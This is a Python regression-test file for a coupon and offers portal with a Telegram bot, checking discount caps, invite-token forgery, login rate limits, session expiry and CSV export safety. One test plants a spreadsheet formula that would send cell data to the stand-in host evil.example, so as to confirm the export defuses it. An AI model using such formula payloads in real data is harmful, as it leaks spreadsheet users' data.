"""Regression tests from the break-it review: each one reproduced a real break before it was fixed."""

import asyncio
import threading
from datetime import datetime, time
from types import SimpleNamespace

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import func, select

from app.bot import handlers
from app.data.generator import IST, generate
from app.data.loader import load_dataset
from app.db.models import Account, CustomerFeature, Deal, OfferDecision, Tenant, TelegramUser
from app.db.session import get_engine, session_scope
from app.features.store import refresh_features
from app.main import app
from app.offers import deals as deal_engine
from app.offers import service
from app.portal import deals_routes
from app.portal import offers as portal_offers
from app.portal import routes as portal_routes
from app.portal.auth import Business, reset_failures
from app.rules.policy import clear_policy_cache, current_policy
from app.security import hash_password, link_token, read_link_token
from app.tenants.registry import TEMPLATE_DIR, get_tenants
from tests.test_portal_data import _wait_job, good_files

SAME = {"Origin": "http://testserver"}
NOW = datetime.combine(datetime.now(IST).date(), time(12), IST)
PW = "sup3r-secret"
DEAL_FORM = {"name": "Diwali", "type": "percent_off", "value": "15", "applies_to": "any", "segments": "all",
             "min_order_value": "699", "max_discount_rs": "300", "valid_hours": "72", "budget_rs": "20000"}


def signup(c, name, email):
    return c.post("/app/register", data={"business_name": name, "email": email, "password": PW, "confirm": PW},
                  headers=SAME, follow_redirects=False)


def seed(slug, n=150):
    with session_scope() as s:
        t = s.scalar(select(Tenant).where(Tenant.slug == slug))
        tid, prefix = t.id, t.coupon_prefix
    ds = generate(TEMPLATE_DIR / "catalog.yaml", n_customers=n, seed=3, as_of=NOW.date(), ref_prefix=prefix)
    with get_engine().begin() as conn:
        load_dataset(conn, tid, ds, progress=lambda *_: None)
        refresh_features(conn, tid, NOW, current_policy(slug).segments)
    return tid


def biz_of(slug):
    with session_scope() as s:
        t = s.scalar(select(Tenant).where(Tenant.slug == slug))
        a = s.scalar(select(Account).where(Account.tenant_id == t.id))
        return Business(a.id, a.email, get_tenants()[slug], t.id)


def customers_where(tid, **feat):
    with session_scope() as s:
        q = select(CustomerFeature.customer_id).where(CustomerFeature.tenant_id == tid)
        for k, v in feat.items():
            q = q.where(getattr(CustomerFeature, k) == v)
        return s.scalars(q.order_by(CustomerFeature.customer_id)).all()


def upload(c, files):
    return c.post("/app/data/upload", data={"confirm": "yes"}, headers=SAME,
                  files={k: (f"{k}.csv", v, "text/csv") for k, v in files.items()})


@pytest.fixture
def c(monkeypatch):
    reset_failures()
    monkeypatch.setattr(portal_routes, "_now", lambda: NOW)
    with TestClient(app, raise_server_exceptions=False) as client:
        signup(client, "Kesar Fashions", "k@kesar.example")
        yield client


@pytest.fixture
def seeded(c):
    return c, seed("kesar-fashions")


@pytest.fixture
def shopkart(monkeypatch):
    """The demo login: a file tenant whose rules come from tenants/shopkart/rules.yaml until edited."""
    reset_failures()
    monkeypatch.setattr(portal_routes, "_now", lambda: NOW)
    with TestClient(app, raise_server_exceptions=False) as client:
        with session_scope() as s:
            tid = s.scalar(select(Tenant.id).where(Tenant.slug == "shopkart"))
            s.add(Account(tenant_id=tid, email="demo@shopkart.example", password_hash=hash_password(PW), created_at=NOW))
        client.post("/app/login", data={"email": "demo@shopkart.example", "password": PW}, headers=SAME)
        seed("shopkart", n=80)
        yield client, tid


def page_codes(c, *paths):
    return {p: c.get(p).status_code for p in paths}


# ---- the demo business can't be taken down by its own settings ----

def test_shopkart_margin_edit_keeps_portal_up_and_caps_below_margin(shopkart):
    c, _ = shopkart
    assert c.post("/app/settings/categories", headers=SAME, data={"margin.electronics": "3"},
                  follow_redirects=False).status_code == 303
    assert set(page_codes(c, "/app", "/app/customers", "/app/settings/rules").values()) == {200}
    assert current_policy("shopkart", get_tenants()["shopkart"].path).rules.cap_pct("electronics") <= 3


def test_shopkart_upload_with_own_categories_survives_a_restart(shopkart):
    c, _ = shopkart
    assert "Files look good" in upload(c, good_files()).text
    assert _wait_job()[0] == "done"
    clear_policy_cache()  # what a restarted server (or the bot process) sees
    assert set(page_codes(c, "/app", "/app/customers", "/app/deals/new").values()) == {200}
    assert c.post("/app/settings/rules/reset", headers=SAME, follow_redirects=False).status_code == 303


# ---- real customers are never handed to strangers on Telegram ----

def test_persona_picker_never_hands_out_uploaded_customers(c):
    assert "Files look good" in upload(c, good_files()).text
    _wait_job()
    tid = biz_of("kesar-fashions").tenant_id
    service.touch_user(tid, 777, "Random Stranger", NOW)
    assert service.assign_persona(tid, 777, None) is None
    assert not service.has_demo_customers(tid)


def test_invite_link_tokens_are_signed_per_business():
    token = link_token(1, 42)
    assert len(token) <= 64 and token.replace("_", "").replace("-", "").isalnum()
    assert read_link_token(1, token) == 42
    assert read_link_token(2, token) is None  # another business
    assert read_link_token(1, token.replace("c42", "c43")) is None  # someone else's id
    assert read_link_token(1, "garbage") is None


def _bot_call(fn, tid, chat_id, args=None, data=None):
    sent = []

    async def send_message(text, **kw):
        sent.append(text)

    async def noop(*a, **kw):
        return None
    update = SimpleNamespace(
        callback_query=SimpleNamespace(data=data, answer=noop, edit_message_reply_markup=noop) if data else None,
        effective_chat=SimpleNamespace(id=chat_id, send_message=send_message, send_action=noop),
        effective_user=SimpleNamespace(full_name="Tester", first_name="Tester"))
    ctx = SimpleNamespace(args=args or [], application=SimpleNamespace(
        bot_data={"ctx": handlers.BotContext(get_tenants()["kesar-fashions"], tid)}))
    asyncio.run(fn(update, ctx))
    return sent


def test_real_customers_join_with_their_invite_link(c):
    assert "Files look good" in upload(c, good_files()).text
    _wait_job()
    tid = biz_of("kesar-fashions").tenant_id
    cid = customers_where(tid)[3]
    assert "invite link" in _bot_call(handlers.start, tid, 901)[0]  # no link: no picker, no stranger's data
    assert "isn't valid" in _bot_call(handlers.start, tid, 901, args=["c1_forged"])[0]
    replies = _bot_call(handlers.start, tid, 901, args=[link_token(tid, cid)])
    assert "connected to Kesar Fashions" in replies[0]
    with session_scope() as s:
        assert s.scalar(select(TelegramUser.customer_id).where(TelegramUser.chat_id == 901)) == cid
    with session_scope() as s:
        s.scalar(select(Tenant).where(Tenant.id == tid)).bot_username = "kesar_bot"
    from app.tenants.registry import clear_tenant_cache
    clear_tenant_cache()
    other = customers_where(tid)[4]
    assert f"t.me/kesar_bot?start={link_token(tid, other)}" in c.get(f"/app/customers/{other}").text


# ---- money rules that could be slipped past ----

def test_flat_off_on_favourite_category_respects_its_cap(seeded):
    """Electronics: margin 8%, cap 5%. Rs 100 off a Rs 500 electronics order would be 20%."""
    _, tid = seeded
    biz = biz_of("kesar-fashions")
    form = {"type": "flat_off", "value": "100", "category": "top_category", "min_order_value": "500",
            "valid_hours": "72"}
    checks = [portal_offers.check_custom(biz, cid, form, NOW)
              for cid in customers_where(tid, top_category="electronics")[:10]]
    assert checks and not any(chk.ok for chk in checks)
    assert any("above the 5% limit for Electronics" in b for chk in checks for b in chk.blocked)


def test_store_wide_flat_off_is_not_valid_on_low_margin_categories(seeded):
    _, tid = seeded
    biz = biz_of("kesar-fashions")
    spec = deal_engine.DealSpec(name="Flat 100", type="flat_off", value=100, applies_to="any", categories=[],
                                segments=["all"], min_order_value=1000, max_discount_rs=None, valid_hours=72,
                                budget_rs=100000)
    assert deal_engine.validate_spec(spec, biz.policy) == []
    with session_scope() as s:
        plan = deal_engine.plan_deal(s, tid, "kesar-fashions", biz.policy, spec, 1, NOW)
    assert plan.send
    for item in plan.send:
        assert "electronics" in item.candidate.excluded_categories and "not valid on Electronics" in item.candidate.terms


@pytest.mark.parametrize("otype", ["flat_off", "bonus_points", "percent_off"])
def test_zero_value_custom_offer_is_refused(seeded, otype):
    _, tid = seeded
    chk = portal_offers.check_custom(biz_of("kesar-fashions"), customers_where(tid)[0],
                                     {"type": otype, "value": "0", "category": "any", "min_order_value": "499",
                                      "valid_hours": "72"}, NOW)
    assert not chk.ok and "above zero" in chk.problems[0]


@pytest.mark.parametrize("field, value", [("valid_hours", "1e400"), ("value", "inf"), ("min_order_value", "nan")])
def test_custom_offer_absurd_numbers_explained_not_500(seeded, field, value):
    c, tid = seeded
    form = {"type": "percent_off", "value": "10", "category": "any", "min_order_value": "499",
            "max_discount_rs": "200", "valid_hours": "72", "action": "check", field: value}
    assert c.post(f"/app/customers/{customers_where(tid)[0]}/custom", headers=SAME, data=form).status_code == 200


@pytest.mark.parametrize("field, value", [("valid_hours", "inf"), ("budget_rs", "1e30")])
def test_deal_form_absurd_numbers_explained_not_500(c, field, value):
    r = c.post("/app/deals", headers=SAME, data={**DEAL_FORM, field: value}, follow_redirects=False)
    assert r.status_code == 200 and ("numbers only" in r.text or "too large" in r.text)


def test_double_click_send_sends_one_offer(seeded):
    c, tid = seeded
    biz = biz_of("kesar-fashions")
    cid = next(x for x in customers_where(tid) if portal_offers.preview(biz, x, NOW)[1].eligible)
    pages = [c.post(f"/app/customers/{cid}/send", data={"offer_key": "best"}, headers=SAME).text for _ in range(3)]
    with session_scope() as s:
        assert s.scalar(select(func.count()).select_from(OfferDecision).where(
            OfferDecision.customer_id == cid, OfferDecision.outcome == "sent")) == 1
    assert "Not sent again" in pages[-1]


def test_deal_cannot_be_launched_twice_at_once(c, monkeypatch):
    c.post("/app/deals", headers=SAME, data=DEAL_FORM)
    with session_scope() as s:
        deal_id = s.scalar(select(Deal.id))
    biz = biz_of("kesar-fashions")
    gate = threading.Barrier(2, timeout=10)

    def both_at_once():  # both requests have passed every check before either writes
        gate.wait()
        return NOW
    monkeypatch.setattr(portal_routes, "_now", both_at_once)
    wins = []

    def launch():
        try:
            deals_routes._mark_sending(biz, deal_id)
            wins.append(1)
        except Exception:
            pass
    threads = [threading.Thread(target=launch) for _ in range(2)]
    [t.start() for t in threads]
    [t.join() for t in threads]
    assert len(wins) == 1


# ---- accounts, sessions and what leaves the system ----

def test_logout_ends_the_session_even_for_a_copied_cookie(c):
    cookie = c.cookies.get("oe_session")
    c.post("/app/logout", headers=SAME)
    c.cookies.set("oe_session", cookie)
    assert c.get("/app", follow_redirects=False).status_code == 303
    assert c.get("/app/login").status_code == 200  # a stale cookie shows the login page, no redirect loop
    c.cookies.clear()
    r = c.post("/app/login", data={"email": "k@kesar.example", "password": PW}, headers=SAME, follow_redirects=False)
    assert r.status_code == 303 and c.get("/app").status_code == 200  # logging in again works


def test_password_change_ends_other_sessions(c):
    from app.portal.auth import set_password
    set_password("k@kesar.example", "an0ther-secret")
    assert c.get("/app", follow_redirects=False).status_code == 303


def test_stranger_cannot_lock_the_owner_out(c):
    from app.portal.auth import AuthError, login
    for _ in range(8):
        with pytest.raises(AuthError):
            login("k@kesar.example", "guess", "203.0.113.9", NOW)
    with pytest.raises(AuthError, match="Too many attempts"):
        login("k@kesar.example", PW, "203.0.113.9", NOW)  # the guesser stays stopped, even with the password
    assert login("k@kesar.example", PW, "198.51.100.7", NOW)  # the owner, elsewhere, gets in


def test_one_address_cannot_guess_across_many_accounts(c):
    from app.portal.auth import AuthError, login
    for i in range(20):
        with pytest.raises(AuthError):
            login(f"someone{i}@x.example", "guess", "203.0.113.9", NOW)
    with pytest.raises(AuthError, match="Too many attempts"):
        login("k@kesar.example", PW, "203.0.113.9", NOW)


def test_signups_are_rate_limited_per_address(c):
    made = sum(signup(c, f"Spam Shop {i}", f"spam{i}@x.example").status_code == 303 for i in range(10))
    assert made == 4  # 5 per hour, one used by the fixture
    assert "Too many new accounts" in signup(c, "One More", "more@x.example").text


def test_overlong_email_is_refused_politely(monkeypatch):
    reset_failures()
    with TestClient(app, raise_server_exceptions=False) as client:
        r = signup(client, "Long Mail", "a" * 200 + "@x.example")
        assert r.status_code == 200 and "valid email" in r.text


def test_pages_cannot_be_framed_by_other_sites(c):
    for path in ("/app/login", "/app", "/health"):
        h = c.get(path).headers
        assert h["x-frame-options"] == "DENY" and "frame-ancestors 'none'" in h["content-security-policy"]


def test_coupon_csv_defuses_spreadsheet_formulas(c):
    import csv
    import io
    from datetime import timedelta
    from app.db.models import Customer
    tid = seed("kesar-fashions", n=20)
    with session_scope() as s:
        cust = s.scalars(select(Customer).where(Customer.tenant_id == tid)).first()
        cust.name = '=HYPERLINK("http://evil.example/?d="&A2,"Click")'
        d = Deal(tenant_id=tid, created_at=NOW, created_by="x", status="done", progress={}, name="D", type="percent_off",
                 value=10, applies_to="any", categories=[], segments=["all"], min_order_value=0, valid_hours=72,
                 budget_rs=1000)
        s.add(d)
        s.flush()
        s.add(OfferDecision(tenant_id=tid, customer_id=cust.id, created_at=NOW, trigger="deal", deal_id=d.id,
                            segment="new", outcome="sent", coupon_code="KF-AAAAAA", headline="10% off", terms="t",
                            liability_rs=10, valid_until=NOW + timedelta(days=1)))
        deal_id = d.id
    rows = list(csv.reader(io.StringIO(c.get(f"/app/deals/{deal_id}/coupons.csv").text)))
    assert rows[1][1].startswith("'=HYPERLINK")
    assert not [cell for row in rows[1:] for cell in row if cell[:1] in ("=", "+", "-", "@")]


def test_claim_confirmation_is_valid_telegram_html(c):
    """Telegram rejects HTML with a bare '&': category labels such as 'Home & Kitchen' contain one."""
    import re
    from datetime import timedelta
    from app.db.models import Customer
    tid = seed("kesar-fashions", n=10)
    with session_scope() as s:
        cid = s.scalar(select(Customer.id).where(Customer.tenant_id == tid))
        s.add(TelegramUser(tenant_id=tid, chat_id=555, customer_id=cid, opted_out=False))
        d = OfferDecision(tenant_id=tid, customer_id=cid, created_at=NOW, trigger="on_demand", segment="new",
                          outcome="sent", coupon_code="KF-BBBBBB", headline="15% off Home & Kitchen",
                          terms="min order ₹699; not valid on Beauty & Personal Care", liability_rs=10,
                          valid_until=datetime.now(IST) + timedelta(days=1))
        s.add(d)
        s.flush()
        did = d.id
    text = _bot_call(handlers.button, tid, 555, data=f"claim:{did}")[0]
    assert "Home &amp; Kitchen" in text and not re.findall(r"&(?!(amp|lt|gt|quot|#x27);)", text)
